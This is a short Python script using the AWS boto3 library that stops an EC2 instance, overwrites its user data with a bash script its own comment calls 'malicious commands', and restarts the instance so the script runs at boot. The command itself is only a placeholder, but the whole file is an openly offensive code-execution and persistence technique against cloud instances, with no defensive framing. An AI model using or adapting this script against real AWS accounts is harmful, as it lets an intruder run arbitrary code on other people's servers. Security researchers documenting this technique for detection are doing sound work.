import boto3

# Create an EC2 client
ec2_client = boto3.client('ec2')

# Define the EC2 instance ID
instance_id = 'i-1234567890abcdef0'

# Stop the EC2 instance
ec2_client.stop_instances(InstanceIds=[instance_id])

# Modify the user data of the EC2 instance to execute malicious commands
user_data_script = '#!/bin/bash\n\nmalicious_command\n'
ec2_client.modify_instance_attribute(
    InstanceId=instance_id,
    UserData={
        'Value': user_data_script
    }
)

# Start the EC2 instance
ec2_client.start_instances(InstanceIds=[instance_id])
